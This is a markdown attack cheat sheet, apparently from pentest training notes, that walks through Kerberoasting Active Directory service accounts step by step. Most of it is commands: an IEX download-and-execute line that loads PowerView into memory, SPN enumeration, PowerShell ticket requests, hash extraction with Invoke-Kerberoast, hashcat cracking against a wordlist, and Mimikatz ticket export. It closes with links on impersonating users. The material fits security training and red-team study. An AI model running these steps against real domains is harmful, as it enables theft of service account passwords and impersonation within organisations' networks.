# Attacking Kerberos

*Target:* Active Directory accounts that have the SPN value set

## Without Mimikatz

1. Read and understand [Kerberos Fundamentals](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
2. Download [powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1) and [upload it to Windows machine](../file_transfer_smbserver/README.md)
3. Import `powerview.ps1` into memory

        powershell
        IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')

4. Enumerate **domain accounts** that have SPN (Service Principal Name) set, i.e., look for **user-generated** service accounts
   1. [GetUserSPNS.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1)
   2. [Find-PSServiceAccounts.ps1](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts)
   3. [PowerView’s "Get-NetUser -SPN"](https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089)
   4. Windows built-in utility **setspn.exe**

            setspn.exe -F -Q */* > Service.txt

5. Request **Kerberos tickets** for the identified service accounts using following **PowerShell** commands

        Add-Type -AssemblyName System.IdentityModel
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList “Replace_With_SPN_Name”

6. List all the available cached tickets

        klist

7. Install the [RiskySPNs](https://github.com/cyberark/RiskySPN) PowerShell module, and obtain the user hash

        Import-Module -Name .\RiskySPNs.psm1 -verbose 
        Invoke-Kerberoast | Select-Object Hash | Out-File -filepath HashCapture.txt

8. Download and import [autokerberoast_noMimikatz.ps1](https://github.com/xan7r/kerberoast/blob/master/autokerberoast_noMimikatz.ps1) PowerShell script
9.  Display the extracted tickets in **hashcat compatible** format
  
        Invoke-AutoKerberoast

10. Use [hashcat](https://hashcat.net/hashcat/) to crack the password

        hashcat -a 0 -m 13100 ./hash.txt /home/kali/Documents/lab/wordlist/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force 

## With Mimikatz

1. Use **Mimikatz** to extract tickets from memory

        .\mimikatz.exe
        standard::base64
        kerberos::list /export

2. Begin offline password cracking
   1. [tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)
   2. [kirbi2john.py](https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py)

3. [Impersonate user](https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/)

## References

* https://cobalt.io/blog/kerberoast-attack-techniques
* https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
* http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
* https://pentestlab.blog/2018/06/04/spn-discovery/
* https://pentestlab.blog/2018/06/12/kerberoast/
* https://github.com/cyberark/RiskySPN
* https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
* https://adsecurity.org/?page_id=1821
* https://cobalt.io/blog/kerberoast-attack-techniques
* https://malicious.link/post/2016/kerberoast-pt3/
* https://pentestlab.blog/2018/06/12/kerberoast/
* https://github.com/nidem/kerberoast
* [Extracting the Ticket](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting#extracting-the-ticket)
* https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
